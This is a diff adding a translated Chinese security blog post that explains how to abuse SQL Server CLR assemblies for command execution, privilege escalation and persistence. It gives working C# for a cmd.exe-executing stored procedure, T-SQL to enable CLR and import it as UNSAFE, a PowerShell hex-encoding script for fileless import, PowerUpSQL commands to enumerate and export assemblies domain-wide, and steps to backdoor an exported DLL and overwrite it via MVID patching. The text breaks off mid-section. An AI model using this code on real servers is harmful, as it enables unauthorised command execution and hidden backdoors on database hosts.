@@ -261,6 +261,248 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017-09-14-attack-sql-server-clr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ꭰ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017-09-14-attack-sql-server-clr/" itemprop="url">【译】攻击SQL Server的CLR库</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-14T12:16:27+08:00">
+                2017-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Translation/" itemprop="url" rel="index">
+                    <span itemprop="name">Translation</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本文中，我将以Nathan Krik的CLR系列文章提到的<a href="https://en.wikipedia.org/wiki/SQL_CLR" target="_blank" rel="external">CLR</a><a href="https://en.wikipedia.org/wiki/Assembly_(CLI" target="_blank" rel="external">assembly</a>)为基础进行拓展。同时我也会介绍如何创建、导入、导出以及修改SQL Server的CRL库去实现提权、命令执行以及持久化操作。</p>
+<p>先让我们来对要介绍的内容进行一个略览。你也可以跳过这部分内容：</p>
+<ul>
+<li>CLR assembly是什么？</li>
+<li>为SQL Server定制化CLR</li>
+<li>将CLR DLL文件转为16进制并导入（不需要通过文件）</li>
+<li>列出CLR的存储过程</li>
+<li>将存在的CLR assembly导出为dll</li>
+<li>修改导出的CLR DLL文件与在SQL Server中对存在的CLR Assembly进行修改</li>
+<li>通过定制化的CLR进行提权</li>
+</ul>
+<h2 id="什么是CLR-assembly"><a href="#什么是CLR-assembly" class="headerlink" title="什么是CLR assembly"></a>什么是CLR assembly</h2><p>为了能够达到本片博客的目的，我们将<a href="https://docs.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">Common Language Runtime</a>(CLR) assembly定义为.Net DLL（也可理解为一组DLL文件），这些文件均能导入至SQL Server。成功导入后，DLL的方法会被链接到存储过程，并通过TSQL执行。尽管创建和导入自定义CLR assembly是开发人员扩展SQL Server的内置函数的好方法，但这也为攻击者制造了机会。</p>
+<h2 id="如何为SQL-Server定制化CLR-DLL"><a href="#如何为SQL-Server定制化CLR-DLL" class="headerlink" title="如何为SQL Server定制化CLR DLL"></a>如何为SQL Server定制化CLR DLL</h2><p>接下来的这段C#模版功能是执行操作系统命令，它是建立在Nathan Kirik的工作成果和一些极棒的<a href="https://msdn.microsoft.com/en-us/library/ms131094.aspx" target="_blank" rel="external">微软文章</a>上。当然，你可以在此基础上进行修改，如果修改完了，记得另存为”C:\temp\cmd_exec.cs”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Data;</div><div class="line">using System.Data.SqlClient;</div><div class="line">using System.Data.SqlTypes;</div><div class="line">using Microsoft.SqlServer.Server;</div><div class="line">using System.IO;</div><div class="line">using System.Diagnostics;</div><div class="line">using System.Text;</div><div class="line"></div><div class="line">public partial class StoredProcedures</div><div class="line">&#123;</div><div class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</div><div class="line">    public static void cmd_exec (SqlString execCommand)</div><div class="line">    &#123;</div><div class="line">        Process proc = new Process();</div><div class="line">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</div><div class="line">        proc.StartInfo.Arguments = string.Format(@&quot; /C &#123;0&#125;&quot;, execCommand.Value);</div><div class="line">        proc.StartInfo.UseShellExecute = false;</div><div class="line">        proc.StartInfo.RedirectStandardOutput = true;</div><div class="line">        proc.Start();</div><div class="line"></div><div class="line">        // Create the record and specify the metadata for the columns.</div><div class="line">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</div><div class="line">        </div><div class="line">        // Mark the beginning of the result set.</div><div class="line">        SqlContext.Pipe.SendResultsStart(record);</div><div class="line"></div><div class="line">        // Set values for each column in the row</div><div class="line">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</div><div class="line"></div><div class="line">        // Send the row back to the client.</div><div class="line">        SqlContext.Pipe.SendResultsRow(record);</div><div class="line">        </div><div class="line">        // Mark the end of the result set.</div><div class="line">        SqlContext.Pipe.SendResultsEnd();</div><div class="line">        </div><div class="line">        proc.WaitForExit();</div><div class="line">        proc.Close();</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<p>现在咱们的目标是通过csc.exe对”C:\temp\cmd_exec.cs”进行编译。即使你没有安装Visual Studio也不用担心，因为.NET框架默认是携带了csc.exe。所以，问题只是这个软件藏在你操作系统的某处。你可以通过下面这段PowerShell命令找到它哦。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-ChildItem</span> -Recurse <span class="string">"C:\Windows\Microsoft.NET\"</span> -Filter <span class="string">"csc.exe"</span> | <span class="built_in">Sort-Object</span> fullname -Descending | <span class="built_in">Select-Object</span> fullname -First <span class="number">1</span> -ExpandProperty fullname</div></pre></td></tr></table></figure>
+<p>假设你已经找到了csc.exe，接着你可以通过下面这样的命令对 “c:\temp\cmd_exec.cs” 进行编译。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</div></pre></td></tr></table></figure>
+<h2 id="如何导入将CLR-DLL导入到SQL-Server"><a href="#如何导入将CLR-DLL导入到SQL-Server" class="headerlink" title="如何导入将CLR DLL导入到SQL Server"></a>如何导入将CLR DLL导入到SQL Server</h2><p>为了将刚生成的dll导入Sql Server，你必须以sysadmin权限登录，同时还需要CREATE ASSEMBLY的权限或者是ALTER ASSEMBLY权限。按照下面的步骤来操作的话能够成功注入DLL并将其与存储过程链接在一起，这么一来的话就可以通过TSQL来执行cmd_exec函数了。</p>
+<p>首先以sysadmin登录SQL Server接着进行下面的查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">-- Select the msdb database</div><div class="line">use msdb</div><div class="line"></div><div class="line">-- Enable show advanced options on the server</div><div class="line">sp_configure &apos;show advanced options&apos;,1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line">-- Enable clr on the server</div><div class="line">sp_configure &apos;clr enabled&apos;,1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line"></div><div class="line">-- Import the assembly</div><div class="line">CREATE ASSEMBLY my_assembly</div><div class="line">FROM &apos;c:\temp\cmd_exec.dll&apos;</div><div class="line">WITH PERMISSION_SET = UNSAFE;</div><div class="line"></div><div class="line">-- Link the assembly to a stored procedure</div><div class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</div><div class="line">GO</div></pre></td></tr></table></figure>
+<p>现在你应该可以通过”msdb”中”cmd_exec”存储过程执行操作系统命令了，效果如下：</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/1.png" alt="1"></p>
+<p>当你完成了这一步，你便可以通过下面的命令删除存储过程和assembly。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DROP PROCEDURE cmd_exec</div><div class="line">DROP ASSEMBLY my_assembly</div></pre></td></tr></table></figure>
+<h2 id="如何将CLR-DLL转为十六进制字符串，而后不通过文件导出呢？"><a href="#如何将CLR-DLL转为十六进制字符串，而后不通过文件导出呢？" class="headerlink" title="如何将CLR DLL转为十六进制字符串，而后不通过文件导出呢？"></a>如何将CLR DLL转为十六进制字符串，而后不通过文件导出呢？</h2><p>如果你阅读过Nathan Kirk’s的<a href="http://sekirkity.com/requested-command-execution-with-sqli-via-seeclrly/" target="_blank" rel="external">系列博客</a>，那你一定知道在将CLR assemblies导入到SQL Server时不必引用物理上的DLL。”CREATE ASSEMBLY”会接受十六进制形式的CLR DLL文件。下面的PowerShell脚本例子会向你展示如何将’cmd_exec.dll’文件转化为TSQL命令，该命令不经过物理文件的引用就可用来创建assembly。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Target file</span></div><div class="line"><span class="variable">$assemblyFile</span> = <span class="string">"c:\temp\cmd_exec.dll"</span></div><div class="line"></div><div class="line"><span class="comment"># Build top of TSQL CREATE ASSEMBLY statement</span></div><div class="line"><span class="variable">$stringBuilder</span> = <span class="built_in">New-Object</span> -Type System.Text.StringBuilder </div><div class="line"><span class="variable">$stringBuilder</span>.Append(<span class="string">"CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x"</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Read bytes from file</span></div><div class="line"><span class="variable">$fileStream</span> = [IO.File]::OpenRead(<span class="variable">$assemblyFile</span>)</div><div class="line"><span class="keyword">while</span> ((<span class="variable">$byte</span> = <span class="variable">$fileStream</span>.ReadByte()) <span class="nomarkup">-gt</span> -<span class="number">1</span>) &#123;</div><div class="line">    <span class="variable">$stringBuilder</span>.Append(<span class="variable">$byte</span>.ToString(<span class="string">"X2"</span>)) | <span class="built_in">Out-Null</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Build bottom of TSQL CREATE ASSEMBLY statement</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"`nWITH PERMISSION_SET = UNSAFE"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Build create procedure command</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Create run os command</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"EXEC[dbo].[cmd_exec] 'whoami'"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Create file containing all commands</span></div><div class="line"><span class="variable">$stringBuilder</span>.ToString() -join <span class="string">""</span> | <span class="built_in">Out-File</span> c:\temp\cmd_exec.txt</div></pre></td></tr></table></figure>
+<p>如果这一切都进行得很顺利，文件”c:\temp\cmd_exec.txt”会包含下面的TSQL命令。以文中的为例，你可以看到十六进制字符被截断了，但是你自己的那块应该更长点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">-- Select the MSDB database</div><div class="line">USE msdb</div><div class="line"></div><div class="line">-- Enable clr on the server</div><div class="line">Sp_Configure &apos;clr enabled&apos;, 1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line"></div><div class="line">-- Create assembly from ascii hex</div><div class="line">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM </div><div class="line">0x4D5A90000300000004000000F[TRUNCATED]</div><div class="line">WITH PERMISSION_SET = UNSAFE </div><div class="line">GO </div><div class="line"></div><div class="line">-- Create procedures from the assembly method cmd_exec</div><div class="line">CREATE PROCEDURE [dbo].[my_assembly] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec]; </div><div class="line">GO </div><div class="line"></div><div class="line">-- Run an OS command as the SQL Server service account</div><div class="line">EXEC[dbo].[cmd_exec] &apos;whoami&apos; </div><div class="line">GO</div></pre></td></tr></table></figure>
+<p>当你在Sql Server中以sysadmin权限运行来自”c:\temp\cmd_exec.txt”的TSQL命令时，输出结果看起来应该和下面的差不多。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/2.png" alt="2"></p>
+<h4 id="利用PowerUpSQL自动化"><a href="#利用PowerUpSQL自动化" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>如果你从未使用过PowerUpSQL，你可以在<a href="https://github.com/NetSPI/PowerUpSQL/wiki" target="_blank" rel="external">这</a>找到安装说明。</p>
+<p>我写了个PowerUpSQL函数，名为Create-SQLFileCLRDLL，这可以用来加快创建类似的DLLs和TSQL脚本。该函数有一些可选参数，用来定制assembly名、类名、方法名以及存储过程名。如果不指定参数的话，这些名字都会随机的。下面是一个基本的命令例子：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PS C:\temp&gt; Create-SQLFileCLRDll -ProcedureName <span class="string">"runcmd"</span> -OutFile runcmd -OutDir c:\temp</div><div class="line">C<span class="comment"># File: c:\temp\runcmd.csc</span></div><div class="line">CLR DLL: c:\temp\runcmd.dll</div><div class="line">SQL Cmd: c:\temp\runcmd.txt</div></pre></td></tr></table></figure>
+<p>下面的这行简短的代码时用来生成10个样本（CLR DLLS/CREATE ASSEMBLY TSQL脚本）。这对于在实验室尝试CLR assemblies来说会非常方便。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>..<span class="number">10</span>| %&#123; Create-SQLFileCLRDll -Verbose -ProcedureName myfile<span class="variable">$_</span> -OutDir c:\temp -OutFile myfile<span class="variable">$_</span> &#125;</div></pre></td></tr></table></figure>
+<h2 id="我是如何列出存在的CLR-Asssemblies和CLR存储过程的呢？"><a href="#我是如何列出存在的CLR-Asssemblies和CLR存储过程的呢？" class="headerlink" title="我是如何列出存在的CLR Asssemblies和CLR存储过程的呢？"></a>我是如何列出存在的CLR Asssemblies和CLR存储过程的呢？</h2><p>你可以使用下面这条TSQL查询去验证你的CLR assembly是否安装正确，或用来寻找已经存在的用户定义的CLR assemblies。</p>
+<p>注意：这个版本的代码是被我修改过的，<a href="https://stackoverflow.com/questions/3155542/sql-server-how-to-list-all-clr-functions-procedures-objects-for-assembly" target="_blank" rel="external">原版在这</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">USE msdb;</div><div class="line">SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], </div><div class="line">            af.file_id,					  	</div><div class="line">            af.name + &apos;.dll&apos; as [file_name],</div><div class="line">            asmbly.clr_name,</div><div class="line">            asmbly.assembly_id,           </div><div class="line">            asmbly.name AS [assembly_name], </div><div class="line">            am.assembly_class,</div><div class="line">            am.assembly_method,</div><div class="line">            so.object_id as [sp_object_id],</div><div class="line">            so.name AS [sp_name],</div><div class="line">            so.[type] as [sp_type],</div><div class="line">            asmbly.permission_set_desc,</div><div class="line">            asmbly.create_date,</div><div class="line">            asmbly.modify_date,</div><div class="line">            af.content								           </div><div class="line">FROM        sys.assembly_modules am</div><div class="line">INNER JOIN  sys.assemblies asmbly</div><div class="line">ON  	    asmbly.assembly_id = am.assembly_id</div><div class="line">INNER JOIN  sys.assembly_files af </div><div class="line">ON 	    asmbly.assembly_id = af.assembly_id </div><div class="line">INNER JOIN  sys.objects so</div><div class="line">ON  	    so.[object_id] = am.[object_id]</div></pre></td></tr></table></figure>
+<p>通过这条查询，我们能够看到文件名、assembly 名，assembly类名，assembly方法以及方法对应的存储过程。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/3.png" alt="3"></p>
+<p>这个时候你应该能看到出现在你眼前的结果中是包含了”my_assembly”的。如果你通过我前面所提到的”Create-SQLFileCLRDll”命令执行了10次TSQL查询，你也能看到与assembly对应的信息。</p>
+<h4 id="利用PowerUpSQL自动化-1"><a href="#利用PowerUpSQL自动化-1" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>为了完成上面这个过程，我在PowerUpSQL中添加了一个名为”Get-SQLStoredProcedureCLR”的函数，该函数会自动迭代整个数据库并为每个assembly提供一一对应的信息。下面是这条命令的示例。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Out-GridView</span></div></pre></td></tr></table></figure>
+<p>你也在所有域SQL服务器上执行下面这条命令（前提是你得有足够的权限）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLInstanceDomain -Verbose | Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
+<h2 id="存储过程参数映射"><a href="#存储过程参数映射" class="headerlink" title="存储过程参数映射"></a>存储过程参数映射</h2><p>攻击者不是唯一创建不安全assemblies的人群。有些情况下，开发人员也会去创建一些能够和操作系统资源交互的assembly或者能够直接执行操作系统命令的assembly。所以，以assembly为目标是可能导致提权的。举个例子来说，如果我们这边是存在不安全的assembly，我们可以尝试定义这些assembly能够接受的参数以及如何使用他们。这里出于乐趣，我们使用下面的这条查询去随意确定cmd_exec存储过程所能接受的参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">SELECT			pr.name as procname,</div><div class="line">                        pa.name as param_name, </div><div class="line">                        TYPE_NAME(system_type_id) as Type,</div><div class="line">                        pa.max_length, </div><div class="line">                        pa.has_default_value,</div><div class="line">                        pa.is_nullable </div><div class="line">FROM 			sys.all_parameters pa</div><div class="line">INNER JOIN 		sys.procedures pr on pa.object_id = pr.object_id</div><div class="line">WHERE 			pr.type like &apos;pc&apos; and pr.name like &apos;cmd_exec&apos;</div></pre></td></tr></table></figure>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/4.png" alt="4"></p>
+<p>在这个例子中，我们可以看到它只接受了名为”execCommand”的字符串参数。以存储过程为目标的攻击者或许能够判断出这可以用于命令执行。</p>
+<h2 id="如何将SQL-Server中的CLR-Assembly导出成DLL。"><a href="#如何将SQL-Server中的CLR-Assembly导出成DLL。" class="headerlink" title="如何将SQL Server中的CLR Assembly导出成DLL。"></a>如何将SQL Server中的CLR Assembly导出成DLL。</h2><p>对已存在的CRL assembly存储过程的功能进行简单的测试不是我们找到升级路径的唯一选项。在SQL Server中，我们可以将用户定义的CLR assemblies导出为DLLS。我们来聊聊CLR识别到CLR源码。开始的第一步是对assemblies进行识别，然后将它们导出为DLLs文件，接下来再是反编译，这样一来我们就可以进行分析其中的问题（也可能被修改插入了后门）。</p>
+<h4 id="利用PowerUpSQL自动化-2"><a href="#利用PowerUpSQL自动化-2" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>上一节内容中，我们提到了如何使用PowerUpSQL命令列出CLR assembly，命令如下。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
+<p>上面的Get-SQLStoredProcedureCLR函数还支持”ExportFolder”选项，如果你设置了该参数，它就会将assemblies导出到指定的文件夹中。下面是一个示例和输出。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -ExportFolder c:\temp  -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/6.png" alt="6"></p>
+<p>完成后，你也可以批量的导出CLR DLLS文件（前提是你得是域用户和sysadmin用户），然后使用下面这条命令就能达到效果。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLInstanceDomain -Verbose | Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> -ExportFolder c:\temp | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
+<p>你可以在输出文件夹中找到DLLs，该脚本会以每台服务器的名字、实例以及数据库名字动态构建文件夹结构。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/7.png" alt=""></p>
+<p>接下来只需要通过你最爱的反编译器就能看到源代码了。在过去一整年里，我成为了dnsSpy的忠实粉丝，至于原因嘛，在你阅读完下一部分就知道了。</p>
+<h2 id="我是如何对CLR-DLL进行修改，同时还将已导入SQL-Server的Assembly进行覆写的？"><a href="#我是如何对CLR-DLL进行修改，同时还将已导入SQL-Server的Assembly进行覆写的？" class="headerlink" title="我是如何对CLR DLL进行修改，同时还将已导入SQL Server的Assembly进行覆写的？"></a>我是如何对CLR DLL进行修改，同时还将已导入SQL Server的Assembly进行覆写的？</h2><p>下面这张图是一张轮廓图，主要展示了通过dnSpy如何反编译、观察、编辑、保存以及再导入已存在SQL Server中的CLR DLL文件。你可以在这下载到<a href="https://github.com/0xd4d/dnSpy/releases" target="_blank" rel="external">dnSpy</a>.</p>
+<p>这里我们就以早些时候从SQL Server导出的cmd_exec.dll为例，对其进行修改。</p>
+<p>第一步，用dnSpy打开cmd_exec.dll文件。左侧栏，往下拉直到你找到cmd_exec方法，选中它。接着你就能看到了源代码，现在可以开始寻找漏洞了。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/8.png" alt="8"></p>
+<p>第二步，在右边包含源码的界面右击然后选择“Edit Method(C#)”。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/9.png" alt="9"></p>
+<p>第三步，编辑你希望的代码。但是，在这个例子中我添加了一个后门，该后门的作用是每调用一次cmd_exec，它就会在”C:\temp\”目录下增加一个文件。示例代码和截图如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[SqlProcedure]</div><div class="line">public static void cmd_exec(SqlString execCommand)</div><div class="line">&#123;</div><div class="line">    Process expr_05 = new Process();</div><div class="line">    expr_05.StartInfo.FileName = &quot;C:\\Windows\\System32\\cmd.exe&quot;;</div><div class="line">    expr_05.StartInfo.Arguments = string.Format(&quot; /C &#123;0&#125;&quot;, execCommand.Value);</div><div class="line">    expr_05.StartInfo.UseShellExecute = true;</div><div class="line">    expr_05.Start();</div><div class="line">    expr_05.WaitForExit();</div><div class="line">    expr_05.Close();</div><div class="line">    Process expr_54 = new Process();</div><div class="line">    expr_54.StartInfo.FileName = &quot;C:\\Windows\\System32\\cmd.exe&quot;;</div><div class="line">    expr_54.StartInfo.Arguments = string.Format(&quot; /C &apos;whoami &gt; c:\\temp\\clr_backdoor.txt&quot;, execCommand.Value);</div><div class="line">    expr_54.StartInfo.UseShellExecute = true;</div><div class="line">    expr_54.Start();</div><div class="line">    expr_54.WaitForExit();</div><div class="line">    expr_54.Close();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/10.png" alt="10"></p>
+<p>第四步，通过点击完成保存修补后的代码。接着点击顶部菜单栏的选择文件，保存模块，保存它。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/11.png" alt="11"></p>
+<p>根据<a href="https://msdn.microsoft.com/en-us/library/system.reflection.module.moduleversionid.aspx" target="_blank" rel="external">微软的资料</a>来看，每次CLR编译，都有一个唯一的GUID生成并会内嵌在编译后的文件头上。所以，识别统一文件的不同版本是可行的。这个ID也可以叫做MVID（模块版本ID）。为了覆写已存在SQL Server中的CLR，我们一定得手动改掉MVID。下面是整个过程的概览。</p>
+<p>第一步，如果没打开cmd_exec，请在dnSpy中打开。接着将可见界面拖到PE部分，选择”#GUID”存储流，接着右键并选择以十六进制格式显示数据。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/12.png" alt="12"></p>
+<p>第二步，你一定得去修改这些被选中的字节，可以修改成任意值。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/13.png" alt="13"></p>
+<p>第三步，从顶部菜单选择文件然后保存模块。</p>
+<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/14.png" alt="14"></p>
+<h4 id="利用PowerShell自动化"><a href="#利用PowerShell自动化" class="headerlink" title="利用PowerShell自动化"></a>利用PowerShell自动化</h4><p>你可以使用我之前提供给你的原生PowerShell命令或者是使用下面示例的PowerUPSQL命令去获取来自新改动的cmd_exec.dll文件的十六进制字节，接着生成ALTER语句。</p>
